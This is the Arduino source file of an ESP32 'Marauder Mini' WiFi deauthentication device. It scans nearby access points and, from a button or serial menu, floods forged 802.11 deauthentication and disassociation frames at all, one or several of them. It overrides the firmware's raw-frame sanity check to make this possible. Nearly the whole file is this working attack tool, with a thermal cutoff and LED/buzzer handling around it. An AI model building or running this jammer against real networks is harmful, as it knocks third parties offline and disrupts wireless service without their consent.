/*
 * ESP32 Marauder Mini - WiFi Deauth
 * ─────────────────────────────────────────
 * DHT11=GPIO5, Buzzer=GPIO13
 * BTN: UP=22, DOWN=26, SELECT=32
 * LED: Red=16, Yellow=17, Green=21, Blue=2
 */

 #include <WiFi.h>
 #include "esp_wifi.h"
 #include "esp_wifi_types.h"
 
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
   return 0;
 }
 
 #include <DHT.h>
 
 // Pins 
 #define PIN_DHT        4
 #define PIN_BUZZER     13
 #define PIN_BTN_UP     22
 #define PIN_BTN_DOWN   26
 #define PIN_BTN_SELECT 32
 #define PIN_LED_RED    16
 #define PIN_LED_YELLOW 17
 #define PIN_LED_GREEN  21
 #define PIN_LED_BLUE   2
 
 #define BUZZ_FREQ 2000
 #define TEMP_WARN   45
 #define TEMP_CUTOFF 50
 #define TEMP_MS     3000
 
 // WiFi Deauth 
 #define MAX_APS 20
 struct APInfo {
   char    ssid[33];
   uint8_t bssid[6];
   int32_t rssi;
   uint8_t channel;
 };
 APInfo   apList[MAX_APS];
 int      apCount       = 0;
 bool     deauthActive  = false;
 bool     deauthSelected[MAX_APS];
 int      deauthIdx     = 0;
 uint32_t deauthCount   = 0;
 
 uint8_t deauthFrame[26] = {
   0xC0, 0x00, 0x3A, 0x01,
   0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
   0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
   0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
   0x00, 0x00, 0x07, 0x00
 };
 
 // DHT11 
 DHT   dht(PIN_DHT, DHT11);
 float currentTemp    = 0;
 bool  thermalShutoff = false;
 unsigned long lastTempMs = 0;
 
 // Button
 struct Button {
   uint8_t pin;
   bool    lastState;
   unsigned long lastMs;
 };
 Button btnUp     = {PIN_BTN_UP,     true, 0};
 Button btnDown   = {PIN_BTN_DOWN,   true, 0};
 Button btnSelect = {PIN_BTN_SELECT, true, 0};
 
 bool btnPressed(Button &b);
 
 // Menu
 enum MenuState {
   MENU_MAIN,
   MENU_SCAN_RESULT,
   MENU_STATUS
 };
 MenuState menuState = MENU_MAIN;
 int menuIdx = 0;
 int menuMax = 0;
 
 // Misc
 unsigned long lastStatusMs = 0;
 bool buzzerOn = false;
 unsigned long buzzerStartMs = 0;
 
 //  LED
 void ledOn(uint8_t pin)  { digitalWrite(pin, HIGH); }
 void ledOff(uint8_t pin) { digitalWrite(pin, LOW); }
 
 void updateLeds() {
   if (thermalShutoff) {
     ledOn(PIN_LED_RED); ledOff(PIN_LED_YELLOW);
     ledOff(PIN_LED_GREEN); ledOff(PIN_LED_BLUE);
     return;
   }
   deauthActive ? ledOff(PIN_LED_RED) : ledOn(PIN_LED_RED);
   (!deauthActive) ? ledOn(PIN_LED_YELLOW) : ledOff(PIN_LED_YELLOW);
   deauthActive ? ledOn(PIN_LED_GREEN) : ledOff(PIN_LED_GREEN);
   deauthActive ? ledOn(PIN_LED_BLUE) : ledOff(PIN_LED_BLUE);
 }
 
 //  Buzzer
 void buzzerBeep(int ms) {
   ledcWriteTone(0, BUZZ_FREQ);
   delay(ms);
   ledcWriteTone(0, 0);
 }
 void buzzerStart() {
   if (!buzzerOn) {
     ledcWriteTone(0, BUZZ_FREQ);
     buzzerOn = true; buzzerStartMs = millis();
   }
 }
 void buzzerUpdate() {
   if (buzzerOn && millis() - buzzerStartMs >= 5000) {
     ledcWriteTone(0, 0); buzzerOn = false;
   }
 }
 
 //  Thermal
 void checkTemp() {
   if (millis() - lastTempMs < TEMP_MS) return;
   lastTempMs = millis();
   float t = dht.readTemperature();
   if (isnan(t)) return;
   currentTemp = t;
   if (t >= TEMP_CUTOFF && !thermalShutoff) {
     Serial.printf("\n[!] THERMAL CUTOFF %.1f°C!\n", t);
     buzzerStart();
     stopDeauth();
     thermalShutoff = true;
     updateLeds();
   } else if (t >= TEMP_WARN) {
     Serial.printf("[!] TEMP WARNING %.1f°C\n", t);
   }
 }
 
 //  Button
 bool btnPressed(Button &b) {
   bool s = digitalRead(b.pin);
   if (s == LOW && b.lastState == HIGH && millis() - b.lastMs > 80) {
     b.lastMs = millis(); b.lastState = LOW;
     return true;
   }
   if (s == HIGH) b.lastState = HIGH;
   return false;
 }
 
 //  WiFi Scan
 void wifiScan() {
   if (deauthActive) { Serial.println("[!] Stop deauth first"); return; }
   WiFi.mode(WIFI_STA);
   WiFi.disconnect();
   delay(100);
   ledOn(PIN_LED_YELLOW);
   Serial.println("\n[WIFI] Scanning...");
   int n = WiFi.scanNetworks();
   apCount = min(n, MAX_APS);
   if (apCount == 0) { Serial.println("[WIFI] No APs found"); return; }
   Serial.printf("[WIFI] Found %d APs:\n", apCount);
   Serial.println("  #  | CH | RSSI | BSSID             | SSID");
   Serial.println("  ---|----|----- |-------------------|--------------------");
   for (int i = 0; i < apCount; i++) {
     WiFi.SSID(i).toCharArray(apList[i].ssid, 33);
     memcpy(apList[i].bssid, WiFi.BSSID(i), 6);
     apList[i].rssi    = WiFi.RSSI(i);
     apList[i].channel = WiFi.channel(i);
     Serial.printf("  %-3d| %-2d | %-4d | %02X:%02X:%02X:%02X:%02X:%02X | %s\n",
       i, apList[i].channel, apList[i].rssi,
       apList[i].bssid[0], apList[i].bssid[1], apList[i].bssid[2],
       apList[i].bssid[3], apList[i].bssid[4], apList[i].bssid[5],
       apList[i].ssid);
   }
   WiFi.scanDelete();
   buzzerBeep(100);
   updateLeds();
 }
 
 //  WiFi Deauth
 void enableDeauth() {
   WiFi.mode(WIFI_STA);
   esp_wifi_start();
   esp_wifi_set_promiscuous(true);
   deauthActive = true;
   deauthCount  = 0;
   deauthIdx    = 0;
   updateLeds();
 }
 
 void startDeauthAll() {
   if (apCount == 0) { Serial.println("[!] Scan first"); return; }
   memset(deauthSelected, true, sizeof(deauthSelected));
   enableDeauth();
   Serial.printf("[DEAUTH] ALL %d APs\n", apCount);
 }
 
 void startDeauthSingle(int idx) {
   if (idx < 0 || idx >= apCount) return;
   memset(deauthSelected, false, sizeof(deauthSelected));
   deauthSelected[idx] = true;
   enableDeauth();
   Serial.printf("[DEAUTH] #%d %s\n", idx, apList[idx].ssid);
 }
 
 void startDeauthMulti(String s) {
   if (apCount == 0) { Serial.println("[!] Scan first"); return; }
   memset(deauthSelected, false, sizeof(deauthSelected));
   int cnt = 0;
   while (s.length() > 0) {
     int c = s.indexOf(',');
     String tok = (c >= 0) ? s.substring(0, c) : s;
     s = (c >= 0) ? s.substring(c + 1) : "";
     tok.trim();
     int idx = tok.toInt();
     if (idx >= 0 && idx < apCount) { deauthSelected[idx] = true; cnt++; }
   }
   if (cnt == 0) { Serial.println("[!] No valid index"); return; }
   enableDeauth();
   Serial.printf("[DEAUTH] %d targets\n", cnt);
 }
 
 void stopDeauth() {
   if (!deauthActive) return;
   Serial.printf("[DEAUTH] Stopped. %lu pkts\n", (unsigned long)deauthCount);
   deauthActive = false;
   esp_wifi_set_promiscuous(false);
   memset(deauthSelected, false, sizeof(deauthSelected));
   updateLeds();
 }
 
 void sendDeauth() {
   int tried = 0;
   while (tried < apCount) {
     if (deauthSelected[deauthIdx]) {
       memcpy(&deauthFrame[10], apList[deauthIdx].bssid, 6);
       memcpy(&deauthFrame[16], apList[deauthIdx].bssid, 6);
       esp_wifi_set_channel(apList[deauthIdx].channel, WIFI_SECOND_CHAN_NONE);
       deauthFrame[0] = 0xC0;
       esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
       deauthFrame[0] = 0xA0;
       esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
       deauthCount += 2;
       deauthIdx = (deauthIdx + 1) % apCount;
       break;
     }
     deauthIdx = (deauthIdx + 1) % apCount;
     tried++;
   }
   if (millis() - lastStatusMs > 5000) {
     Serial.printf("[DEAUTH] %lu pkts | temp=%.1f°C\n",
       (unsigned long)deauthCount, currentTemp);
     lastStatusMs = millis();
   }
   delay(1);
 }
 
 
 //  Menu
 void showMenu() {
   switch (menuState) {
     case MENU_MAIN:
       menuMax = 4;
       Serial.println("\n╔══════════════════════════════╗");
       Serial.println("║     ESP32 MARAUDER MINI      ║");
       Serial.println("╠══════════════════════════════╣");
       Serial.printf("║ %s 0. WiFi Scan           ║\n", menuIdx==0?">>":"  ");
       Serial.printf("║ %s 1. Deauth All          ║\n", menuIdx==1?">>":"  ");
       Serial.printf("║ %s 2. Stop                ║\n", menuIdx==2?">>":"  ");
       Serial.printf("║ %s 3. Status              ║\n", menuIdx==3?">>":"  ");
       Serial.println("╚══════════════════════════════╝");
       Serial.printf("  Temp: %.1f°C\n", currentTemp);
       break;
 
     case MENU_SCAN_RESULT:
       menuMax = apCount;
       Serial.println("\n── Select target ────────────");
       for (int i = 0; i < apCount; i++)
         Serial.printf(" %s %d. %s (ch%d, %ddBm)\n",
           menuIdx==i?">>":"  ", i, apList[i].ssid, apList[i].channel, apList[i].rssi);
       Serial.println(" [SELECT] deauth | [UP/DOWN] navigate");
       break;
 
     case MENU_STATUS:
       Serial.println("\n── Status ───────────────────");
       Serial.printf("  Temp    : %.1f°C %s\n", currentTemp,
         thermalShutoff ? "[SHUTOFF]" : "");
       Serial.printf("  Deauth  : %s | %lu pkts\n",
         deauthActive ? "ACTIVE" : "OFF", (unsigned long)deauthCount);
       if (deauthActive)
         for (int i = 0; i < apCount; i++)
           if (deauthSelected[i])
             Serial.printf("    -> #%d %s\n", i, apList[i].ssid);
       Serial.println("─────────────────────────────");
       break;
   }
 }
 
 void menuSelect() {
   switch (menuState) {
     case MENU_MAIN:
       switch (menuIdx) {
         case 0:
           wifiScan();
           if (apCount > 0) { menuState = MENU_SCAN_RESULT; menuIdx = 0; }
           showMenu();
           break;
         case 1: startDeauthAll(); break;
         case 2:
           stopDeauth();
           thermalShutoff = false;
           break;
         case 3: menuState = MENU_STATUS; showMenu(); break;
       }
       break;
 
     case MENU_SCAN_RESULT:
       startDeauthSingle(menuIdx);
       break;
 
     case MENU_STATUS:
       menuState = MENU_MAIN; menuIdx = 0; showMenu();
       break;
   }
 }
 
 void handleButtons() {
   if (btnPressed(btnUp)) {
     buzzerBeep(30);
     if (menuIdx > 0) menuIdx--;
     showMenu();
   }
   if (btnPressed(btnDown)) {
     buzzerBeep(30);
     if (menuIdx < menuMax - 1) menuIdx++;
     showMenu();
   }
   if (btnPressed(btnSelect)) {
     buzzerBeep(50);
     menuSelect();
   }
 }
 
 //  Serial (backup)
 void handleSerial() {
   if (!Serial.available()) return;
   String cmd = Serial.readStringUntil('\n');
   cmd.trim();
 
   if (cmd.equalsIgnoreCase("help") || cmd == "?") {
     Serial.println("\n═══ COMMANDS ═══════════════════");
     Serial.println("  menu          Show menu");
     Serial.println("  scan          WiFi scan");
     Serial.println("  deauth all    Deauth all APs");
     Serial.println("  deauth 0,2,5  Deauth selected");
     Serial.println("  deauth stop   Stop deauth");
     Serial.println("  stop          Stop everything");
     Serial.println("  status        Show status");
     Serial.println("  temp          Read temperature");
     Serial.println("════════════════════════════════\n");
   }
   else if (cmd.equalsIgnoreCase("menu"))         { menuState=MENU_MAIN; menuIdx=0; showMenu(); }
   else if (cmd.equalsIgnoreCase("scan"))          wifiScan();
   else if (cmd.equalsIgnoreCase("deauth all"))    startDeauthAll();
   else if (cmd.equalsIgnoreCase("deauth stop"))   stopDeauth();
   else if (cmd.startsWith("deauth "))             startDeauthMulti(cmd.substring(7));
   else if (cmd.equalsIgnoreCase("stop"))          { stopDeauth(); thermalShutoff=false; }
   else if (cmd.equalsIgnoreCase("status"))        { menuState=MENU_STATUS; showMenu(); }
   else if (cmd.equalsIgnoreCase("temp")) {
     Serial.println("[DHT11] Reading 5 times...");
     for (int i = 0; i < 5; i++) {
       delay(2500);
       float t = dht.readTemperature();
       float h = dht.readHumidity();
       Serial.printf("  #%d: Temp=%.1f°C Hum=%.1f%% %s\n",
         i, t, h, isnan(t) ? "[FAIL]" : "[OK]");
     }
   }
   else Serial.println("[!] Unknown. Type 'help'");
 }
 
 // ══════════════════════════════════════════
 //  Setup & Loop
 // ══════════════════════════════════════════
 void setup() {
   Serial.begin(115200);
   delay(500);
 
   pinMode(PIN_BTN_UP,     INPUT_PULLUP);
   pinMode(PIN_BTN_DOWN,   INPUT_PULLUP);
   pinMode(PIN_BTN_SELECT, INPUT_PULLUP);
   pinMode(PIN_LED_RED,    OUTPUT);
   pinMode(PIN_LED_YELLOW, OUTPUT);
   pinMode(PIN_LED_GREEN,  OUTPUT);
   pinMode(PIN_LED_BLUE,   OUTPUT);
 
   ledcSetup(0, BUZZ_FREQ, 8);
   ledcAttachPin(PIN_BUZZER, 0);
   ledcWriteTone(0, 0);
 
   pinMode(PIN_DHT, INPUT_PULLUP);
   dht.begin();
 
   uint8_t leds[] = {PIN_LED_RED, PIN_LED_YELLOW, PIN_LED_GREEN, PIN_LED_BLUE};
   for (int i = 0; i < 4; i++) { ledOn(leds[i]); delay(100); }
   buzzerBeep(150);
   for (int i = 3; i >= 0; i--) { ledOff(leds[i]); delay(100); }
 
   updateLeds();
 
   showMenu();
 }
 
 void loop() {
   handleButtons();
   handleSerial();
   checkTemp();
   buzzerUpdate();
   if (deauthActive) sendDeauth();
 }
 